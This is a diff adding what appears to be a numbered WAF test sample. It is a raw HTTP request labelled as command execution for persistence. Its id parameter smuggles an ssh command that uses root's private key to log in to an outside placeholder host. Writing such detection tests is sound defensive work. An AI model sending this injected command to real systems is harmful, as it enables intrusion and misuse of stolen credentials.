@@ -1,0 +1,9 @@
+# 命令执行_权限维持-06507055
+# 利用密钥远程登录
+GET /?id=ssh%20-i%20%2Froot%2F.ssh%2Fid_rsa%20root@2.2.2.x&bid=hd_tag_m8mv2605 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2605
+RM-PRO-Token: 8492570ef8522e640c1cd1a466b4abd5
+RM-PRO-Time: 1742808518757
+User-Agent: curl/7.83.1
+
